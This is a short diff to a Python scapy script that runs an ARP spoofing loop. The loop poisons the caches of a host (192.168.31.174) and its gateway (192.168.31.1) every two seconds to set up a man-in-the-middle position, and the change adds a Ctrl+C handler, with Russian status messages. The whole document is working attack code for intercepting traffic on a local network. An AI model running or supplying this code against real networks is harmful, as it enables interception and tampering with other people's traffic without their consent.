@@ -18,9 +18,12 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 send_packets_count = 0
-while True:
-    spoof("192.168.31.174", "192.168.31.1")
-    spoof("192.168.31.1", "192.168.31.174")
-    send_packets_count = send_packets_count + 2
-    print("\r[+] Отправлено пакетов: " + str(send_packets_count), end="")
-    time.sleep(2)
+try:
+    while True:
+        spoof("192.168.31.174", "192.168.31.1")
+        spoof("192.168.31.1", "192.168.31.174")
+        send_packets_count = send_packets_count + 2
+        print("\r[+] Отправлено пакетов: " + str(send_packets_count), end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[+] Обнаружено нажатие Ctrl + C ... Выходим")
